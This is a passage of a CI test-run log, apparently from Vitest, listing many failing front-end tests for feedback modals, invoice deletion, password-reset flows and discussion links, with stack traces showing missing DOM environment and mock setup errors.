2025-11-18T17:36:11.1217374Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mopens full screenshot modal when screenshot is clicked
2025-11-18T17:36:11.1237722Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mformats dates correctly
2025-11-18T17:36:11.1239858Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackDetail.test.tsx[2m > [22mFeedbackDetail[2m > [22mshows reference number
2025-11-18T17:36:11.1242144Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdoes not render when closed
2025-11-18T17:36:11.1244055Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrenders when open
2025-11-18T17:36:11.1245990Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas description textarea
2025-11-18T17:36:11.1262483Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas type selector buttons
2025-11-18T17:36:11.1264479Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhas screenshot upload area
2025-11-18T17:36:11.1266521Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates type when buttons are clicked
2025-11-18T17:36:11.1268822Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mupdates description when typing
2025-11-18T17:36:11.1271003Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows error when submitting empty description
2025-11-18T17:36:11.1273033Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mhandles file selection
2025-11-18T17:36:11.1274992Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mrejects files larger than 5MB
2025-11-18T17:36:11.1297394Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when close button is clicked
2025-11-18T17:36:11.1299766Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mcloses modal when cancel button is clicked
2025-11-18T17:36:11.1302027Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mdisables submit button when submitting
2025-11-18T17:36:11.1304269Z [31m[1m[7m FAIL [27m[22m[39m __tests__/components/feedback/FeedbackModal.test.tsx[2m > [22mFeedbackModal[2m > [22mshows success state after successful submission
2025-11-18T17:36:11.1307162Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould show password reset button only for approved users
2025-11-18T17:36:11.1310435Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould open password reset modal when reset button is clicked
2025-11-18T17:36:11.1313480Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould call onSuccess when reset is successful in modal
2025-11-18T17:36:11.1316349Z [31m[1m[7m FAIL [27m[22m[39m __tests__/pages/admin/user-management-password-reset.test.tsx[2m > [22mUser Management - Password Reset Feature[2m > [22mshould not show password reset for non-admin users
2025-11-18T17:36:11.1338609Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:11.1340477Z [90m [2m❯[22m resetClipboardStubOnView node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m115:32[22m[39m
2025-11-18T17:36:11.1342464Z [90m [2m❯[22m node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m156:21[22m[39m
2025-11-18T17:36:11.1343219Z 
2025-11-18T17:36:11.1343669Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[80/545]⎯[22m[39m
2025-11-18T17:36:11.1343999Z 
2025-11-18T17:36:11.1345918Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows custom confirmation modal when delete is clicked
2025-11-18T17:36:11.1348377Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.1350343Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.1352256Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.1353756Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m85:28[22m[39m
2025-11-18T17:36:11.1354458Z     [90m 83| [39m
2025-11-18T17:36:11.1355204Z     [90m 84| [39m  test('shows custom confirmation modal when delete is clicked', async…
2025-11-18T17:36:11.1356089Z     [90m 85| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.1377049Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.1377988Z     [90m 86| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1378622Z     [90m 87| [39m    
2025-11-18T17:36:11.1378828Z 
2025-11-18T17:36:11.1379201Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[81/545]⎯[22m[39m
2025-11-18T17:36:11.1379515Z 
2025-11-18T17:36:11.1380794Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcloses modal when cancel is clicked
2025-11-18T17:36:11.1382940Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.1384889Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.1387029Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.1388578Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m98:28[22m[39m
2025-11-18T17:36:11.1389353Z     [90m 96| [39m
2025-11-18T17:36:11.1390007Z     [90m 97| [39m  test('closes modal when cancel is clicked', async () => {
2025-11-18T17:36:11.1390800Z     [90m 98| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.1391500Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.1392279Z     [90m 99| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1393225Z     [90m100| [39m    
2025-11-18T17:36:11.1393463Z 
2025-11-18T17:36:11.1393896Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[82/545]⎯[22m[39m
2025-11-18T17:36:11.1394220Z 
2025-11-18T17:36:11.1395744Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mcalls onDeleteInvoice when confirmed
2025-11-18T17:36:11.1418287Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.1420290Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.1422214Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.1423747Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m112:28[22m[39m
2025-11-18T17:36:11.1424543Z     [90m110| [39m
2025-11-18T17:36:11.1425271Z     [90m111| [39m  test('calls onDeleteInvoice when confirmed', async () => {
2025-11-18T17:36:11.1426094Z     [90m112| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.1427015Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.1428112Z     [90m113| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1428754Z     [90m114| [39m    
2025-11-18T17:36:11.1428980Z 
2025-11-18T17:36:11.1429398Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[83/545]⎯[22m[39m
2025-11-18T17:36:11.1429747Z 
2025-11-18T17:36:11.1431267Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mdisplays enhanced file information
2025-11-18T17:36:11.1432829Z [31m[1mReferenceError[22m: document is not defined[39m
2025-11-18T17:36:11.1433971Z [90m [2m❯[22m render node_modules/@testing-library/react/dist/pure.js:[2m257:5[22m[39m
2025-11-18T17:36:11.1435269Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m127:5[22m[39m
2025-11-18T17:36:11.1436095Z     [90m125| [39m
2025-11-18T17:36:11.1436736Z     [90m126| [39m  test('displays enhanced file information', () => {
2025-11-18T17:36:11.1458542Z     [90m127| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1459285Z     [90m   | [39m    [31m^[39m
2025-11-18T17:36:11.1459756Z     [90m128| [39m    
2025-11-18T17:36:11.1460298Z     [90m129| [39m    // Check file details
2025-11-18T17:36:11.1460634Z 
2025-11-18T17:36:11.1461080Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[84/545]⎯[22m[39m
2025-11-18T17:36:11.1461403Z 
2025-11-18T17:36:11.1488061Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mhides invoice immediately on deletion (optimistic update)
2025-11-18T17:36:11.1490490Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.1492549Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.1494500Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.1496074Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m136:28[22m[39m
2025-11-18T17:36:11.1497113Z     [90m134| [39m
2025-11-18T17:36:11.1518127Z     [90m135| [39m  test('hides invoice immediately on deletion (optimistic update)', as…
2025-11-18T17:36:11.1519175Z     [90m136| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.1519932Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.1520707Z     [90m137| [39m    render(<ContractDetailsModal {...defaultProps} />);
2025-11-18T17:36:11.1521773Z     [90m138| [39m    
2025-11-18T17:36:11.1522007Z 
2025-11-18T17:36:11.1522441Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[85/545]⎯[22m[39m
2025-11-18T17:36:11.1522768Z 
2025-11-18T17:36:11.1524297Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion-simple.test.tsx[2m > [22mInvoice Deletion - ContractDetailsModal[2m > [22mshows loading state during deletion
2025-11-18T17:36:11.1526482Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'Symbol(Node prepared with document state workarounds)')[39m
2025-11-18T17:36:11.1528633Z [90m [2m❯[22m prepareDocument node_modules/@testing-library/user-event/dist/esm/document/prepareDocument.js:[2m10:17[22m[39m
2025-11-18T17:36:11.1530521Z [90m [2m❯[22m Object.setupMain [as setup] node_modules/@testing-library/user-event/dist/esm/setup/setup.js:[2m52:5[22m[39m
2025-11-18T17:36:11.1532004Z [36m [2m❯[22m __tests__/contracts/invoice-deletion-simple.test.tsx:[2m155:28[22m[39m
2025-11-18T17:36:11.1532697Z     [90m153| [39m
2025-11-18T17:36:11.1533324Z     [90m154| [39m  test('shows loading state during deletion', async () => {
2025-11-18T17:36:11.1534079Z     [90m155| [39m    const user = userEvent.setup();
2025-11-18T17:36:11.1534724Z     [90m   | [39m                           [31m^[39m
2025-11-18T17:36:11.1535220Z     [90m156| [39m    
2025-11-18T17:36:11.1535821Z     [90m157| [39m    // Mock slow deletion that never resolves
2025-11-18T17:36:11.1536427Z 
2025-11-18T17:36:11.1553434Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[86/545]⎯[22m[39m
2025-11-18T17:36:11.1553797Z 
2025-11-18T17:36:11.1555495Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mcomplete invoice deletion flow with optimistic updates
2025-11-18T17:36:11.1558568Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mhandles deletion failure and reverts optimistic update
2025-11-18T17:36:11.1561314Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.integration.test.tsx[2m > [22mInvoice Deletion Integration Tests[2m > [22mkeyboard navigation and accessibility
2025-11-18T17:36:11.1563022Z [31m[1mTypeError[22m: useRouter.mockReturnValue is not a function[39m
2025-11-18T17:36:11.1564354Z [36m [2m❯[22m __tests__/contracts/invoice-deletion.integration.test.tsx:[2m137:30[22m[39m
2025-11-18T17:36:11.1565345Z     [90m135| [39m      pathname: '/contracts',
2025-11-18T17:36:11.1565845Z     [90m136| [39m    };
2025-11-18T17:36:11.1566533Z     [90m137| [39m    (useRouter as jest.Mock).mockReturnValue(mockRouter);
2025-11-18T17:36:11.1567546Z     [90m   | [39m                             [31m^[39m
2025-11-18T17:36:11.1568084Z     [90m138| [39m
2025-11-18T17:36:11.1568555Z     [90m139| [39m    // Setup auth mock
2025-11-18T17:36:11.1568859Z 
2025-11-18T17:36:11.1569259Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[87/545]⎯[22m[39m
2025-11-18T17:36:11.1569611Z 
2025-11-18T17:36:11.1571520Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mrenders delete button for existing invoices
2025-11-18T17:36:11.1574823Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows custom confirmation modal when delete button is clicked
2025-11-18T17:36:11.1577953Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcloses confirmation modal when cancel is clicked
2025-11-18T17:36:11.1580583Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcalls onDeleteInvoice when confirmation is clicked
2025-11-18T17:36:11.1583671Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mdisplays enhanced file information
2025-11-18T17:36:11.1586463Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows loading spinner during deletion
2025-11-18T17:36:11.1589352Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mhides invoice immediately on deletion (optimistic update)
2025-11-18T17:36:11.1592056Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22msuccessfully deletes invoice from storage and database
2025-11-18T17:36:11.1594708Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mhandles deletion error gracefully
2025-11-18T17:36:11.1598123Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mextracts file path correctly from various URL formats
2025-11-18T17:36:11.1600965Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file type on upload
2025-11-18T17:36:11.1603267Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file size on upload
2025-11-18T17:36:11.1604699Z [31m[1mReferenceError[22m: supabase is not defined[39m
2025-11-18T17:36:11.1605652Z [36m [2m❯[22m __tests__/contracts/invoice-deletion.test.tsx:[2m102:6[22m[39m
2025-11-18T17:36:11.1606298Z     [90m100| [39m
2025-11-18T17:36:11.1607001Z     [90m101| [39m    // Setup default supabase mocks
2025-11-18T17:36:11.1607853Z     [90m102| [39m    (supabase.auth.getSession as jest.Mock).mockResolvedValue({
2025-11-18T17:36:11.1608551Z     [90m   | [39m     [31m^[39m
2025-11-18T17:36:11.1609162Z     [90m103| [39m      data: { session: { user: mockUser } },
2025-11-18T17:36:11.1609685Z     [90m104| [39m    });
2025-11-18T17:36:11.1609907Z 
2025-11-18T17:36:11.1610281Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[88/545]⎯[22m[39m
2025-11-18T17:36:11.1610581Z 
2025-11-18T17:36:11.1613636Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mrenders delete button for existing invoices
2025-11-18T17:36:11.1617463Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows custom confirmation modal when delete button is clicked
2025-11-18T17:36:11.1620835Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcloses confirmation modal when cancel is clicked
2025-11-18T17:36:11.1624126Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mcalls onDeleteInvoice when confirmation is clicked
2025-11-18T17:36:11.1627462Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mdisplays enhanced file information
2025-11-18T17:36:11.1630799Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mshows loading spinner during deletion
2025-11-18T17:36:11.1634022Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContractDetailsModal - Invoice Deletion UI[2m > [22mhides invoice immediately on deletion (optimistic update)
2025-11-18T17:36:11.1637607Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22msuccessfully deletes invoice from storage and database
2025-11-18T17:36:11.1640528Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mhandles deletion error gracefully
2025-11-18T17:36:11.1643489Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mContracts Page - Invoice Deletion Logic[2m > [22mextracts file path correctly from various URL formats
2025-11-18T17:36:11.1646468Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file type on upload
2025-11-18T17:36:11.1649279Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-deletion.test.tsx[2m > [22mInvoice Deletion Functionality[2m > [22mFile Upload Validation[2m > [22mvalidates file size on upload
2025-11-18T17:36:11.1652506Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to change-password when password_change_required is true
2025-11-18T17:36:11.1656043Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mLogin with password reset required[2m > [22mshould redirect to profile if password is OK but profile incomplete
2025-11-18T17:36:11.1698569Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould show admin reset message when password_reset_by_admin is true
2025-11-18T17:36:11.1701697Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould update password and clear flags on successful change
2025-11-18T17:36:11.1704641Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould enforce password requirements
2025-11-18T17:36:11.1721899Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/password-reset-flow.test.tsx[2m > [22mPassword Reset Flow Integration[2m > [22mChange Password Page[2m > [22mshould redirect to dashboard if password change not required
2025-11-18T17:36:11.1725011Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display comment count with proper styling when comments exist
2025-11-18T17:36:11.1728042Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould display zero comments with gray styling
2025-11-18T17:36:11.1730548Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould use singular form for 1 comment
2025-11-18T17:36:11.1732974Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mVisual Display[2m > [22mshould show chat icon
2025-11-18T17:36:11.1735417Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould call onDiscussionClick when discussion link is clicked
2025-11-18T17:36:11.1738442Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould not trigger assignment click when discussion link is clicked
2025-11-18T17:36:11.1741401Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mClick Interactions[2m > [22mshould trigger assignment click when card is clicked outside discussion link
2025-11-18T17:36:11.1743983Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mHover Effects[2m > [22mshould apply hover styles to discussion link
2025-11-18T17:36:11.1746589Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould have proper button role for discussion link
2025-11-18T17:36:11.1749121Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mAccessibility[2m > [22mshould be keyboard navigable
2025-11-18T17:36:11.1751412Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mDynamic Updates[2m > [22mshould update comment count when prop changes
2025-11-18T17:36:11.1753639Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle very large comment counts
2025-11-18T17:36:11.1755895Z [31m[1m[7m FAIL [27m[22m[39m tests/workspace/discussionLinkUI.test.tsx[2m > [22mDiscussion Link UI Tests[2m > [22mEdge Cases[2m > [22mshould handle negative comment counts as zero
2025-11-18T17:36:11.1768283Z [31m[1mTypeError[22m: Cannot read properties of undefined (reading 'navigator')[39m
2025-11-18T17:36:11.1770913Z [90m [2m❯[22m resetClipboardStubOnView node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m115:32[22m[39m
2025-11-18T17:36:11.1773688Z [90m [2m❯[22m node_modules/@testing-library/user-event/dist/esm/utils/dataTransfer/Clipboard.js:[2m156:21[22m[39m
2025-11-18T17:36:11.1776129Z 
2025-11-18T17:36:11.1778598Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[89/545]⎯[22m[39m
2025-11-18T17:36:11.1780584Z 
2025-11-18T17:36:11.1783612Z [31m[1m[7m FAIL [27m[22m[39m __tests__/contracts/invoice-helpers.test.ts[2m > [22mInvoice Helper Functions[2m > [22mformatFileSize[2m > [22mformats bytes correctly
2025-11-18T17:36:11.1786633Z [31m[1mAssertionError[22m: expected '' to be '0 B' // Object.is equality[39m
2025-11-18T17:36:11.1788019Z 
2025-11-18T17:36:11.1789971Z - Expected
2025-11-18T17:36:11.1792011Z + Received
2025-11-18T17:36:11.1794005Z 
2025-11-18T17:36:11.1795760Z - 0 B
2025-11-18T17:36:11.1797882Z 
2025-11-18T17:36:11.1800394Z [36m [2m❯[22m __tests__/contracts/invoice-helpers.test.ts:[2m14:33[22m[39m
2025-11-18T17:36:11.1802895Z     [90m 12| [39m
2025-11-18T17:36:11.1805386Z     [90m 13| [39m    test('formats bytes correctly', () => {
2025-11-18T17:36:11.1814983Z     [90m 14| [39m      expect(formatFileSize(0)).toBe('0 B');
2025-11-18T17:36:11.1815894Z     [90m   | [39m                                [31m^[39m
2025-11-18T17:36:11.1816959Z     [90m 15| [39m      expect(formatFileSize(100)).toBe('100 B');
2025-11-18T17:36:11.1818052Z     [90m 16| [39m      expect(formatFileSize(1024)).toBe('1 KB');
2025-11-18T17:36:11.1832350Z 
2025-11-18T17:36:11.1848513Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[90/545]⎯[22m[39m
2025-11-18T17:36:11.1849063Z 
2025-11-18T17:36:11.1859439Z [31m[1m[7m FAIL [27m[22m[39m __tests__/integration/assignmentOverview.test.js[2m > [22mAssignment Overview Integration Tests[2m > [22mEnd-to-end assignment overview flow[2m > [22mshould display correct assignments for admin with no filters
2025-11-18T17:36:11.1861789Z [31m[1mTypeError[22m: supabase.from.mockImplementation is not a function[39m
2025-11-18T17:36:11.1863410Z [36m [2m❯[22m setupMocksForAdmin __tests__/integration/assignmentOverview.test.js:[2m298:17[22m[39m
2025-11-18T17:36:11.1864516Z     [90m296| [39m  });
2025-11-18T17:36:11.1874718Z     [90m297| [39m
